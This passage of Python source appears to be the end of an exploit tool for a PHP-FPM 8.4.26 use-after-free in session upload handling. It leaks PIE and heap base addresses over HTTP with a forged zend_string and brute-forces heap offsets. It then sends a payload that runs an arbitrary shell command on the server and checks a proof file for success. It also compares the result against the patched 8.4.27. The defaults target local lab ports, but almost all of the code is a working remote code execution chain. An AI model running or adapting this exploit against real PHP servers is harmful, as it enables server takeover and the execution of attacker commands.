def _dechunk(body: bytes) -> bytes:
    """Decode an HTTP chunked body; return it unchanged when not chunked."""
    if not re.match(rb"^[0-9a-fA-F]+\r\n", body):
        return body
    out = bytearray()
    pos = 0
    while pos < len(body):
        eol = body.find(b"\r\n", pos)
        if eol < 0:
            break
        try:
            size = int(body[pos:eol], 16)
        except ValueError:
            return body
        pos = eol + 2
        if size == 0:
            break
        out += body[pos:pos + size]
        pos += size
        if body[pos:pos + 2] == b"\r\n":
            pos += 2
    return bytes(out)


def leak_bases_http(base_url: str, builder_url: str,
                    version: str) -> tuple[int, int]:
    """Leak PIE and Zend-MM chunk bases over HTTP only.

    The stale short-session string is pointed at a forged zend_string
    header in a reclaimed big field.  Its length spans the stale zval
    array (chunk pointer) and the execute_ex handler table (PIE pointer).
    The leak read is repeated because the worker aborts after answering.
    """
    geom = _leak_geometry(version)
    if geom is None:
        raise RuntimeError(f"no HTTP leak geometry for PHP {version}")
    chain = Target(base_url)
    app = Target(base_url + "/app.php")
    builder = Target(builder_url)
    size = geom["size"]
    read_len = geom["read_len"]
    header = geom["header_content_off"]
    content = bytearray(size)
    struct.pack_into("<I", content, header, 0x40000000)      # refcount
    struct.pack_into("<I", content, header + 4, 6)           # IS_STRING
    struct.pack_into("<Q", content, header + 8, 0)           # h
    struct.pack_into("<Q", content, header + 0x10, read_len) # len
    fill = min(read_len, size - header - 0x18)
    content[header + 0x18:header + 0x18 + fill] = b"Q" * fill
    parts = [{"name": f"pad{i}", "data": b"C" * pad}
             for i, pad in enumerate(geom["pads"])]
    parts.append({"name": "big", "data": bytes(content)})
    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
    parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
    for attempt in range(10):
        try:
            builder.get(geom["arm_path"], cookie=b"PHPSESSID=" + OOM_SID)
            chain.get("/app.php", cookie=b"PHPSESSID=" + OOM_SID)
            ref_session_post(builder, REF_SID)
            _status, _headers, body = app.post_multipart(
                parts, b"HTTPLEAK", cookie=b"PHPSESSID=" + REF_SID,
                timeout=180.0)
            raw = _dechunk(body)
            idx = raw.find(b"r\t")
            if idx < 0:
                continue
            read = raw[idx + 2:idx + 2 + read_len]
            if len(read) < read_len:
                continue
            chunk_ptr = struct.unpack_from("<Q", read,
                                           geom["chunk_ptr_off"])[0]
            pie_ptr = struct.unpack_from("<Q", read,
                                         geom["pie_ptr_off"])[0]
            chunk = chunk_ptr - geom["chunk_base_off"]
            pie = pie_ptr - geom["pie_base_off"]
            if not (0x700000000000 <= chunk_ptr < 0x800000000000):
                continue
            if not (0x550000000000 <= pie_ptr < 0x570000000000):
                continue
            if chunk & 0x1fffff or pie & 0x1fffff:
                continue
            if chunk_ptr & 0xfff:
                continue
            print(f"[*] HTTP leak attempt {attempt}: "
                  f"chunk=0x{chunk:x} pie=0x{pie:x}")
            return pie, chunk
        except (OSError, RuntimeError, TimeoutError):
            continue
    raise RuntimeError("HTTP leak failed (all reads short or invalid)")


def _local_bases(version: str) -> tuple[int, int]:
    """PIE base and Zend-MM chunk base from /proc/<pid>/maps only.

    This deliberately does not open /proc/<pid>/mem: it is the local-lab
    fallback for the memory oracle (maps + the profile symbol offset).
    Remote targets use leak_bases_http() instead.
    """
    pid = find_pool_worker(version, "chain")
    if pid is None:
        raise RuntimeError(f"no php-fpm 'chain' worker for {version}")
    exe = os.readlink(f"/proc/{pid}/exe")
    pie = None
    chunk = None
    with open(f"/proc/{pid}/maps", encoding="utf-8") as handle:
        for line in handle:
            parts = line.split()
            start_s, end_s = parts[0].split("-")
            start, end = int(start_s, 16), int(end_s, 16)
            if len(parts) >= 6 and parts[-1] == exe:
                if pie is None or start < pie:
                    pie = start
            if chunk is None and "rw-p" in parts[1] and end - start == MEM_CHUNK:
                chunk = start
    if pie is None or chunk is None:
        raise RuntimeError("could not derive PIE/chunk bases from maps")
    return pie, chunk


def cmd_leak(args) -> int:
    """Leak the chunk and PIE bases over HTTP and print them."""
    try:
        pie, chunk = leak_bases_http(args.base, args.builder, args.version)
    except (OSError, RuntimeError) as exc:
        print(f"[!] {exc}")
        return 1
    print(f"[+] chunk=0x{chunk:x} pie=0x{pie:x}")
    return 0


def cmd_no_oracle(args) -> int:
    """HTTP-only endgame: no /proc/<pid>/mem reads at exploit time.

    The absolute heap/PIE bases are stable for the lifetime of the FPM
    master (workers are forked from it).  By default they are leaked over
    HTTP; --chunk/--pie override the leak and /proc/<pid>/maps is a local
    fallback.  The reclaim geometry is normalized with one throw-away
    pads+big request to a 404 endpoint (same allocation shape as
    _probe_cover, no scanning), then the (d-offset, content-offset) pair
    is brute-forced over the two slots and their possible cover offsets.
    """
    pie = getattr(args, "pie", 0)
    chunk = getattr(args, "chunk", 0)
    if not chunk or not pie:
        try:
            pie, chunk = leak_bases_http(args.base, args.builder, args.version)
            print("[*] bases from HTTP stale-string leak: "
                  f"pie=0x{pie:x} chunk=0x{chunk:x}")
        except (OSError, RuntimeError) as exc:
            print(f"[!] HTTP leak failed: {exc}")
            try:
                pie, chunk = _local_bases(args.version)
            except (OSError, RuntimeError) as local_exc:
                print(f"[!] cannot auto-detect bases locally: {local_exc}")
                print("    pass --chunk/--pie (stable for the FPM master lifetime)")
                return 1
            print("[*] bases from /proc/<pid>/maps (no /proc/<pid>/mem): "
                  f"pie=0x{pie:x} chunk=0x{chunk:x}")
    zif = pie + _zif_offset(args.version)
    size, candidates, pads = _no_oracle_geometry(args.version)
    command = args.command.encode("latin1")
    if not command or b"\x00" in command:
        print("[!] command must be non-empty and contain no NUL bytes")
        return 1
    if len(command) > 0x57:
        print(f"[!] command too long ({len(command)} > 87 bytes)")
        return 1
    proof = (args.proof_file or "out/p1").lstrip("/")
    base = Target(args.base)
    chain404 = Target(args.base + "/nope.php")
    chainapp = Target(args.base + "/app.php")
    builder = Target(args.builder)
    local_proof = os.path.join(LAB, "webroot", proof)

    print(f"[*] no-oracle: chunk=0x{chunk:x} pie=0x{pie:x} zif=0x{zif:x}")
    for attempt in range(8):
        d_off, k = candidates[attempt % len(candidates)]
        d = chunk + d_off
        try:
            os.remove(local_proof)
        except OSError:
            pass
        # arm #1, then normalize the post-arm heap with a pads+big request
        # that has the same allocation shape as the calibrated probe.
        big_session_post(builder, OOM_SID, args.size)
        producer_get(base, OOM_SID)
        parts = [{"name": f"pad{i}", "data": b"C" * pad}
                 for i, pad in enumerate(pads)]
        parts.append({"name": "big", "data": b"\x00" * size})
        chain404.post_multipart(parts, b"NORACLE0", timeout=120.0)
        # rebuild the ref session and re-arm
        ref_session_post(builder, REF_SID)
        big_session_post(builder, OOM_SID, args.size)
        producer_get(base, OOM_SID)
        forged = _build_endgame_payload(d, k, size, zif, command)
        status, _h, _b = _consume_b(chainapp, forged)
        print(f"[*] attempt {attempt}: d=0x{d:x} k=0x{k:x} status={status}")
        for _ in range(4):
            time.sleep(0.35)
            pstatus, _ph, pbody = base.get("/" + proof)
            if pstatus == 200 and pbody:
                print(f"[+] RCE proof via /{proof}: {pbody[:120]!r}")
                return 0
        print("    no proof, retrying")
    print(f"[!] no proof at /{proof}")
    return 1


def cmd_chain(args) -> int:
    print(f"[*] chain: build sessions -> producer -> consumer ({args.phase} phase)")
    builder = Target(args.builder)
    if not os.path.isfile(session_file(args.version, OOM_SID)):
        print("[*] build-oom")
        big_session_post(builder, OOM_SID, 4 << 20)
    if not os.path.isfile(session_file(args.version, REF_SID)):
        print("[*] build-ref")
        ref_session_post(builder, REF_SID)
    chain = Target(args.base)
    status, body = producer_get(chain, OOM_SID)
    print(f"[*] producer status={status} body={body[:80]!r}")
    oracle = Oracle(args.version)
    d = oracle.unserialize_data()
    print(f"[*] BG.data=0x{d:x} level={oracle.unserialize_level()}")
    if args.phase == "primitive":
        return cmd_primitive(args)
    if args.phase == "endgame":
        return cmd_endgame(args)
    return 0


def cmd_patchcheck(args) -> int:
    versions = ["8.4.26", "8.4.27"]
    ports = {"8.4.26": (8110, 8111), "8.4.27": (8120, 8121)}
    for version in versions:
        base = f"http://127.0.0.1:{ports[version][0]}"
        builder_url = f"http://127.0.0.1:{ports[version][1]}"
        print(f"\n=== {version} ===")
        chain_t = Target(base)
        builder = Target(builder_url)
        if not os.path.isfile(session_file(version, OOM_SID)):
            big_session_post(builder, OOM_SID, 4 << 20)
        # lifecycle
        worker = find_pool_worker(version, "chain")
        status, body = producer_get(chain_t, OOM_SID)
        time.sleep(0.2)
        worker2 = find_pool_worker(version, "chain")
        print(f"producer status={status} worker {worker}->{worker2} "
              f"({'DIED' if worker != worker2 else 'survived'})")
        try:
            oracle = Oracle(version)
            d = oracle.unserialize_data()
            level = oracle.unserialize_level()
            print(f"BG.data=0x{d:x} level={level} "
                  f"{'STALE-ARMED' if d and level == 1 else 'clean'}")
        except RuntimeError as exc:
            print(f"oracle: {exc}")
    print("\n[*] expected: 8.4.26 STALE-ARMED, 8.4.27 clean "
          "(php_basic_early_rinit memsets BG before body parse)")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    parser.add_argument("--base", default="http://127.0.0.1:8110")
    parser.add_argument("--builder", default="http://127.0.0.1:8111")
    parser.add_argument("--version", default="8.4.26")
    parser.add_argument("--sid", default=OOM_SID.decode())
    parser.add_argument("--size", type=int, default=4 << 20)
    parser.add_argument("--value", type=int, default=424242)
    parser.add_argument("--pad", type=int, default=0)
    parser.add_argument("--sweep", default=None,
                        help="comma-separated pad sizes for reclaim-probe")
    parser.add_argument("--oracle", action="store_true")
    parser.add_argument("--phase", choices=("probe", "primitive", "endgame"),
                        default="primitive")
    parser.add_argument("--command", default="id>out/p1")
    parser.add_argument("--proof-file", default="out/p1")
    parser.add_argument("--chunk", type=lambda x: int(x, 0), default=0)
    parser.add_argument("--pie", type=lambda x: int(x, 0), default=0)
    sub = parser.add_subparsers(dest="cmd", required=True)
    for name in ("lifecycle", "oracle", "build-oom", "build-ref", "producer",
                 "reclaim-probe", "primitive", "endgame", "chain", "patchcheck",
                 "leak", "no-oracle"):
        sub.add_parser(name)
    args = parser.parse_args()
    dispatch = {
        "lifecycle": cmd_lifecycle,
        "oracle": cmd_oracle,
        "build-oom": cmd_build_oom,
        "build-ref": cmd_build_ref,
        "producer": cmd_producer,
        "reclaim-probe": cmd_reclaim_probe,
        "primitive": cmd_primitive,
        "endgame": cmd_endgame,
        "chain": cmd_chain,
        "patchcheck": cmd_patchcheck,
        "leak": cmd_leak,
        "no-oracle": cmd_no_oracle,
    }
    return dispatch[args.cmd](args)


if __name__ == "__main__":
    sys.exit(main())
